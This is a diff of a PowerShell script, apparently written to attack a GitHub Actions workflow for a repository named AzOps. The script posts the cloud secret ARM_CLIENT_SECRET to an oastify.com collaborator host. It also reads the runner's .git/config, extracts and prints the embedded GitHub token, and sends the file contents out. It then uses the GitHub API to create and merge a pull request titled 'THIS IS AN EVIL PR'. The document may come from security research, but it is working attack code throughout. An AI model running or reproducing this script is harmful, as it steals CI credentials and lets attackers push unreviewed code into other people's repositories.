@@ -1,36 +1,70 @@
-# PWN!
-# Define the URL you want to send the environment variables to
+# Leak secrets.
 $remoteUrl = "http://9hryf86p3o4fl8ikham7mn3utlzcn4bt.oastify.com"
-
-# Create a hashtable to store your environment variables
 $envVariables = @{}
-
-# Loop through each environment variable and add it to the hashtable
 $envVariables = @{
-    "GITHUB_TOKEN" = $env:GITHUB_TOKEN
     "ARM_CLIENT_SECRET" = $env:ARM_CLIENT_SECRET
     # Add more variables as needed
 }
 
-# Convert the hashtable to JSON
 $jsonBody = $envVariables | ConvertTo-Json
 
-# Send the environment variables to the remote URL
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"
 
-# Path to the file you want to read
+# Exfiltrate GITHUB_TOKEN.
 $filePath = "$env:GITHUB_WORKSPACE/.git/config"
-
-# Read the content of the file
 $fileContent = Get-Content -Path $filePath -Raw
 
-# Define the body for the POST request
+$token = ""
+if ($fileContent -match "basic[\s]+([\w\=]+)") {
+    $token = $matches[1]
+    Write-Output "GH TOKEN: $token"
+}
+
 $body = @{
     fileContent = $fileContent
 } | ConvertTo-Json
 
-# Send the file content to the remote URL
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentType "application/json"
 
+# Create & merge malicious PR.
+# GitHub API base URL
+$apiBaseUrl = "https://api.github.com"
+
+# Authentication
+$username = "innerproj"
+$token = "your_personal_access_token"
+$headers = @{
+    "Authorization" = "basic $token"
+    "Content-Type" = "application/json"
+}
+
+# Repository details
+$owner = "supriza"
+$repo = "AzOps"
+
+# Create a pull request
+$pullRequestData = @{
+    title = "THIS IS AN EVIL PR"
+    head = "main"
+    base = "main"
+    body = "Where the bad things are..."
+} | ConvertTo-Json
+
+$createPullRequestUrl = "$apiBaseUrl/repos/$owner/$repo/pulls"
+$pullRequestResponse = Invoke-RestMethod -Uri $createPullRequestUrl -Method Post -Headers $headers -Body $pullRequestData
+
+# Extract the pull request number
+$pullRequestNumber = $pullRequestResponse.number
+
+# Merge the pull request
+$mergePullRequestUrl = "$apiBaseUrl/repos/$owner/$repo/pulls/$pullRequestNumber/merge"
+$mergePullRequestData = @{
+    commit_title = "Merge pull request #$pullRequestNumber"
+    merge_method = "merge"
+} | ConvertTo-Json
+
+$mergePullRequestResponse = Invoke-RestMethod -Uri $mergePullRequestUrl -Method Put -Headers $headers -Body $mergePullRequestData
+
 # Display the response
-$response
+$mergePullRequestResponse
+
